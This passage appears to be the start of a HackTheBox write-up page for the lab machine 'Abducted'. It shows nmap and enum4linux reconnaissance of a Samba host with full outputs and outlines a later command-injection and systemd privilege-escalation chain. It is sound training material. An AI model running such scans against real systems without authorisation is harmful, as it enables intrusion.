@@ -1,0 +1,1425 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<link rel="icon" type="image/x-icon" href="/cybersec_logo.ico">
+<title>Abducted - Small printer misconfiguration gets machine pwned</title>
+<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+<link rel="stylesheet" type='text/css' href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
+  integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
+  crossorigin="anonymous" referrerpolicy="no-referrer" />
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Sans+Mono:ital,wght@0,400..700;1,400..700&display=swap');
+
+  .font-jersey {
+
+    font-family: "Ubuntu Sans Mono", monospace;
+    font-optical-sizing: auto;
+    font-style: normal;
+  }
+
+
+  .md-content .katex-display {
+    max-width: 100%;
+    overflow-x: auto;
+    overflow-y: hidden;
+    -webkit-overflow-scrolling: touch;
+    padding-left: 0.25rem;
+    padding-right: 0.25rem;
+  }
+
+  .md-content .katex-display>.katex {
+    display: inline-block;
+    max-width: 100%;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: 300ms ease-in-out;
+  }
+
+  .is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: opacity 300ms ease-in-out;
+  }
+
+  html.is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  html.is-animating {
+    cursor: progress;
+  }
+
+  html.is-leaving .swup-transition-fade {
+    opacity: 0;
+  }
+</style>
+
+<script src="https://unpkg.com/swup@4"></script>
+<script src="https://unpkg.com/@swup/preload-plugin@3"></script>
+<script src="https://unpkg.com/@swup/progress-plugin@3"></script>
+<script>
+  const swup = new Swup({
+    containers: ['#swup'],
+    animationSelector: '[class*="swup-transition-"]',
+    cache: true,
+    preload: true,
+    animateHistoryBrowsing: true,
+
+    plugins: [
+      new SwupPreloadPlugin(),
+      new SwupProgressPlugin()
+    ]
+  })
+  window.swup = swup
+</script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"
+  crossorigin="anonymous"></script>
+
+<script>
+  
+
+  
+  const KATEX_CONFIG = {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false},
+      {left: "\\[", right: "\\]", display: true},
+      {left: "\\(", right: "\\)", display: false}
+    ],
+    ignoredTags: ["script", "noscript", "style", "textarea", "pre", "code"],
+    throwOnError: false
+  };
+
+  
+  function renderKatex() {
+    
+    if (typeof renderMathInElement !== "function") {
+      console.log("⏳ Waiting for KaTeX to load...");
+      return;
+    }
+
+    
+    const contentArea = document.getElementById('swup') || document.body;
+
+    try {
+      renderMathInElement(contentArea, KATEX_CONFIG);
+      console.log("✅ KaTeX rendered successfully");
+    } catch (error) {
+      console.error("❌ KaTeX rendering error:", error);
+    }
+  }
+
+  
+  function renderKatexWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof renderMathInElement === "function") {
+        renderKatex();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ KaTeX auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering KaTeX...");
+        
+        setTimeout(() => renderKatexWithRetry(3, 50), 50);
+      });
+      console.log("✅ KaTeX-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderKatexWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+  
+  window.renderKatex = renderKatex;
+</script>
+
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+
+  let initialized = false;
+
+  function renderMermaid() {
+    const contentArea = document.getElementById('swup') || document.body;
+    const mermaidBlocks = contentArea.querySelectorAll('.language-mermaid, .mermaid');
+
+    if (mermaidBlocks.length === 0) {
+      console.log("ℹ️ No mermaid blocks found on this page");
+      return;
+    }
+
+    if (!initialized) {
+      mermaid.initialize({startOnLoad: false, theme: 'dark'});
+      initialized = true;
+    }
+
+    mermaidBlocks.forEach(el => {
+      if (el.dataset.processed === 'true') {
+        const source = el.dataset.mermaidSource;
+        if (source) {
+          el.innerHTML = source;
+          el.removeAttribute('data-processed');
+        }
+      } else {
+        el.dataset.mermaidSource = el.textContent;
+      }
+    });
+
+    mermaid.run({nodes: mermaidBlocks})
+      .then(() => console.log("✅ Mermaid rendered successfully"))
+      .catch(err => console.error("❌ Mermaid rendering error:", err));
+  }
+
+  function renderMermaidWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof mermaid.initialize === "function") {
+        renderMermaid();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ Mermaid auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering mermaid...");
+        
+        setTimeout(() => renderMermaidWithRetry(3, 50), 50);
+      });
+      console.log("✅ Mermaid-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderMermaidWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+
+
+</script>
+
+
+</head>
+
+<body class="min-h-screen flex flex-col bg-black font-jersey text-white text-3xl">
+  <header>
+    <div class="sticky absolute top-0 z-50">
+  <nav class="w-full border-b border-gray-800 bg-[#070709]/95 backdrop-blur-sm text-gray-100">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6">
+      <div class="flex items-center justify-between h-16">
+        
+        <div class="flex items-center gap-3">
+
+          <a href='http://localhost:1313/' class="flex items-center gap-3 group" aria-label="Homepage">
+
+            <img src='/cybersec_logo.png' alt="Esteban Pangelinan - Cybersecurity"
+              class="w-10 h-10 rounded-sm border-2 border-gray-700 object-cover transition-transform duration-300 transform group-hover:scale-105"
+              style="animation: border-breathe 4s ease-in-out infinite;" />
+            <span class="text-white text-lg sm:text-xl md:text-2xl lg:text-3xl font-semibold tracking-wide">
+              root@epangelinan: cd
+              <span class="inline-block ml-2" style="animation: flicker 1.6s steps(2, end) infinite;">_</span>
+            </span>
+          </a>
+        </div>
+
+        
+        <div class="flex items-center gap-4">
+          
+          <div class="hidden md:flex items-center">
+            
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a aria-current="true" href="/writeups/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+          </div>
+
+          
+          <div class="md:hidden">
+            <button id="nav-toggle" aria-controls="mobile-menu" aria-expanded="false"
+              class="inline-flex items-center justify-center p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-400"
+              aria-label="Open menu">
+              <svg class="h-6 w-6 text-gray-200" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                stroke="currentColor" aria-hidden="true">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      
+      <div id="mobile-menu" class="md:hidden hidden pb-4">
+        
+        
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a aria-current="true" href="/writeups/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+      </div>
+    </div>
+  </nav>
+
+  
+  <style>
+    @keyframes flicker {
+      0% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      10% {
+        opacity: 0.2;
+        transform: translateY(-1px);
+      }
+
+      20% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      100% {
+        opacity: 1;
+      }
+    }
+
+    @keyframes border-breathe {
+      0% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+
+      50% {
+        box-shadow: 0 0 18px 6px rgba(99, 102, 241, 0.03);
+      }
+
+      100% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+    }
+  </style>
+
+  
+  <script>
+    (function () {
+      const btn = document.getElementById('nav-toggle');
+      const menu = document.getElementById('mobile-menu');
+      if (!btn || !menu) return;
+      btn.addEventListener('click', () => {
+        const open = menu.classList.toggle('hidden') === false;
+        btn.setAttribute('aria-expanded', open ? 'true' : 'false');
+      });
+    })();
+  </script>
+</div>
+
+  </header>
+
+  <main class="flex-1 w-full">
+    <div id="swup" class="swup-transition-fade">
+      <div class="max-w-3xl lg:max-w-6xl xl:max-w-7xl mx-auto px-5 sm:px-8 lg:px-10 py-10 lg:py-16">
+        
+<main class="max-w-6xl mx-auto px-4 sm:px-6 pt-24 pb-12 text-gray-100">
+  <div class="grid grid-cols-12 gap-6">
+    <aside class="hidden lg:block col-span-3">
+      <div class="sticky top-24">
+        <div class="mb-3 text-xs uppercase tracking-widest text-gray-500">Table of Contents</div><nav class="toc text-sm text-gray-300 border border-gray-800/70 bg-[#070709] rounded-sm p-4">
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>OVERVIEW</strong></a></li>
+    <li><a href="#recon"><strong>RECON</strong></a></li>
+    <li><a href="#enumeration"><strong>ENUMERATION</strong></a></li>
+    <li><a href="#foothold"><strong>FOOTHOLD</strong></a></li>
+    <li><a href="#privesc"><strong>PRIVESC</strong></a></li>
+    <li><a href="#takeaways"><strong>TAKEAWAYS</strong></a></li>
+  </ul>
+</nav>
+        </nav></div>
+    </aside>
+
+    <article class="col-span-12 lg:col-span-7">
+      <header class="mb-6">
+  <h1 class="text-2xl sm:text-3xl md:text-4xl tracking-wide text-white">
+    Abducted - Small printer misconfiguration gets machine pwned
+  </h1>
+
+  <div class="mt-2 flex flex-wrap items-center gap-x-3 gap-y-2 text-sm sm:text-base text-gray-400">
+    <span class="font-mono">Jun 15, 2026 • 01:38</span>
+    <span class="text-gray-700">/</span>
+    <span class="font-mono">14 min read</span>
+  </div><div class="mt-3 flex flex-wrap gap-2"><a href="/%20tags/htb-medium"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #HTB - Medium
+    </a><a href="/%20tags/linux"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #Linux
+    </a><a href="/%20tags/pentesting"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #Pentesting
+    </a></div></header>
+
+
+      <div class="lg:hidden mb-6">
+        <details class="border border-gray-800/70 bg-[#070709] rounded-sm">
+          <summary class="cursor-pointer select-none px-4 py-3 text-gray-200 hover:text-white transition-colors">
+            Table of Contents
+          </summary>
+          <div class="px-4 pb-4 toc text-sm text-gray-300">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>OVERVIEW</strong></a></li>
+    <li><a href="#recon"><strong>RECON</strong></a></li>
+    <li><a href="#enumeration"><strong>ENUMERATION</strong></a></li>
+    <li><a href="#foothold"><strong>FOOTHOLD</strong></a></li>
+    <li><a href="#privesc"><strong>PRIVESC</strong></a></li>
+    <li><a href="#takeaways"><strong>TAKEAWAYS</strong></a></li>
+  </ul>
+</nav>
+          </div>
+        </details>
+      </div>
+
+      <div class="md-surface border border-gray-800/70 bg-[#070709] rounded-sm p-4 sm:p-6">
+        <div class="md-content text-base leading-relaxed text-gray-200">
+          <h2 id="overview" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>OVERVIEW</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p><em>Abducted</em> is a medium-rated Linux machine on the HackTheBox platform. Taking over the machine requires port enumeration to find a vulnerable Samba print service, command injection to get a foothold through a known CVE, lateral movement via SMB misconfigurations, and privilege escalation through a malicious systemd drop-in.</p>
+<h2 id="recon" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>RECON</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>After obtaining the target machine&rsquo;s IP address, I ran an nmap scan to identify open TCP ports:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nmap -sS -oN nmap_scan.txt 10.129.27.170 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>            </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The scan revealed three open TCP ports, one for SSH and two for Samba SMB:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-06-15 12:04 PDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.27.170
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-06-11T07:04:18
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_clock-skew: 1s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 18.21 seconds</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Below is the UDP scan, which didn&#39;t reveal anything extra</span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-06-15 12:05 PDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.27.170
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">993</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
+</span></span><span style="display:flex;"><span>112/udp   closed mcidas
+</span></span><span style="display:flex;"><span>137/udp   open   netbios-ns
+</span></span><span style="display:flex;"><span>177/udp   closed xdmcp
+</span></span><span style="display:flex;"><span>559/udp   closed teedtap
+</span></span><span style="display:flex;"><span>826/udp   closed unknown
+</span></span><span style="display:flex;"><span>1719/udp  closed h323gatestat
+</span></span><span style="display:flex;"><span>49186/udp closed unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.04 seconds</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>With this port scan, I only saw two points of entry: <strong>ssh</strong> and <strong>smb</strong>.</p>
+<h2 id="enumeration" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>ENUMERATION</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>I went ahead and ran the <strong>enum4linux</strong> tool against the target machine&rsquo;s IP to enumerate SMB shares and users:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# enum4linux 10.129.27.170
+</span></span><span style="display:flex;"><span>Starting enum4linux v0.9.1 <span style="color:#f92672">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span style="color:#f92672">)</span> on Mon Jun <span style="color:#ae81ff">15</span> 12:16:26 2026
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=========================================(</span> Target Information <span style="color:#f92672">)=========================================</span>                   
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>Target ........... 10.129.27.170                              
+</span></span><span style="display:flex;"><span>RID Range ........ 500-550,1000-1050
+</span></span><span style="display:flex;"><span>Username ......... <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>Password ......... <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">===========================(</span> Enumerating Workgroup/Domain on 10.129.27.170 <span style="color:#f92672">)===========================</span>                    
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got domain/workgroup name: WORKGROUP                      
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">===============================(</span> Nbtstat Information <span style="color:#66d9ef">for</span> 10.129.27.170 <span style="color:#f92672">)===============================</span>                    
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>Looking up status of 10.129.27.170                            
+</span></span><span style="display:flex;"><span>        ABDUCTED        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+</span></span><span style="display:flex;"><span>        ABDUCTED        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
+</span></span><span style="display:flex;"><span>        ABDUCTED        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+</span></span><span style="display:flex;"><span>        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+</span></span><span style="display:flex;"><span>        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        MAC Address <span style="color:#f92672">=</span> 00-00-00-00-00-00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">===================================(</span> Session Check on 10.129.27.170 <span style="color:#f92672">)===================================</span>                   
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Server 10.129.27.170 allows sessions using username <span style="color:#e6db74">&#39;&#39;</span>, password <span style="color:#e6db74">&#39;&#39;</span>                                                     
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">================================(</span> Getting domain SID <span style="color:#66d9ef">for</span> 10.129.27.170 <span style="color:#f92672">)================================</span>                   
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>Domain Name: WORKGROUP                                        
+</span></span><span style="display:flex;"><span>Domain Sid: <span style="color:#f92672">(</span>NULL SID<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Can<span style="color:#e6db74">&#39;t determine if host is part of domain or part of a workgroup                                                        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                                              
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                                              
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ==================================( OS information on 10.129.27.170 )==================================                    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                                              
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                                              
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[E] Can&#39;</span>t get OS info with smbclient                          
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got OS info <span style="color:#66d9ef">for</span> 10.129.27.170 from srvinfo:               
+</span></span><span style="display:flex;"><span>        ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services
+</span></span><span style="display:flex;"><span>        platform_id     :       <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>        os version      :       6.1
+</span></span><span style="display:flex;"><span>        server type     :       0x809a03
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=======================================(</span> Users on 10.129.27.170 <span style="color:#f92672">)=======================================</span>                   
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: scott    Name: Scott Mercer    Desc: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>scott<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x3e8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">=================================(</span> Share Enumeration on 10.129.27.170 <span style="color:#f92672">)=================================</span>                   
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>smbXcli_negprot_smb1_done: No compatible protocol selected by server.
+</span></span><span style="display:flex;"><span>
